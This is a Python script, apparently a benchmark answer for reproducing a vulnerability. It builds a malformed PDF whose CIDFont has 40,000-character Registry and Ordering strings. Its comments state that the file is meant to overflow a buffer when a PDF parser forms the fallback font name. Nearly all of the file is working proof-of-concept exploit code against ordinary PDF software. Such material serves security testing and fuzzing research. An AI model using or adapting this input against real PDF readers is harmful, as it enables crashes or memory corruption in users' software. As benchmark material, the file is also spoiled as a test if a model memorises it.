import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Generate a PDF with a CIDFont that has extremely long Registry and Ordering strings
        # to trigger the fallback name construction "<Registry>-<Ordering>" and overflow.
        reg_len = 40000
        ord_len = 40000
        registry = "A" * reg_len
        ordering = "B" * ord_len

        header = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"

        objs = []

        # 1 0 obj - Catalog
        obj1 = "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        objs.append(obj1)

        # 2 0 obj - Pages
        obj2 = "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        objs.append(obj2)

        # 3 0 obj - Page
        obj3 = (
            "3 0 obj\n"
            "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200]\n"
            "/Resources << /Font << /F1 4 0 R >> >>\n"
            "/Contents 5 0 R >>\n"
            "endobj\n"
        )
        objs.append(obj3)

        # 4 0 obj - Type0 font referencing CIDFont (6 0 R)
        obj4 = (
            "4 0 obj\n"
            "<< /Type /Font /Subtype /Type0 /BaseFont /FALLBACKFONT /Encoding /Identity-H\n"
            "/DescendantFonts [6 0 R] >>\n"
            "endobj\n"
        )
        objs.append(obj4)

        # 5 0 obj - Content stream
        content_stream = "BT\n/F1 12 Tf\n72 120 Td\n(Hi) Tj\nET\n"
        content_bytes = content_stream.encode("latin1")
        obj5 = (
            f"5 0 obj\n<< /Length {len(content_bytes)} >>\nstream\n"
            f"{content_stream}"
            "endstream\nendobj\n"
        )
        objs.append(obj5)

        # 6 0 obj - CIDFont with huge CIDSystemInfo Registry and Ordering
        cid_sys_info = f"<< /Registry ({registry}) /Ordering ({ordering}) /Supplement 0 >>"
        obj6 = (
            "6 0 obj\n"
            "<< /Type /Font /Subtype /CIDFontType0 /BaseFont /ZZZ\n"
            f"/CIDSystemInfo {cid_sys_info}\n"
            "/DW 1000 /FontDescriptor 7 0 R >>\n"
            "endobj\n"
        )
        objs.append(obj6)

        # 7 0 obj - FontDescriptor
        obj7 = (
            "7 0 obj\n"
            "<< /Type /FontDescriptor /FontName /ZZZ /Flags 4 /Ascent 1000 /Descent -200\n"
            "/CapHeight 700 /ItalicAngle 0 /StemV 80 /FontBBox [0 -200 1000 900] >>\n"
            "endobj\n"
        )
        objs.append(obj7)

        # Assemble PDF and compute xref
        out = bytearray()
        out += header
        offsets = [0]  # placeholder for object 0 (free)
        for obj in objs:
            offsets.append(len(out))
            out += obj.encode("latin1")

        xref_offset = len(out)
        num_objs = len(objs) + 1  # including object 0
        xref = []
        xref.append(f"xref\n0 {num_objs}\n")
        # free object
        xref.append("0000000000 65535 f \n")
        # in-use objects
        for off in offsets[1:]:
            xref.append(f"{off:010d} 00000 n \n")
        out += "".join(xref).encode("latin1")

        trailer = (
            "trailer\n"
            f"<< /Size {num_objs} /Root 1 0 R >>\n"
            "startxref\n"
            f"{xref_offset}\n"
            "%%EOF\n"
        )
        out += trailer.encode("latin1")

        return bytes(out)
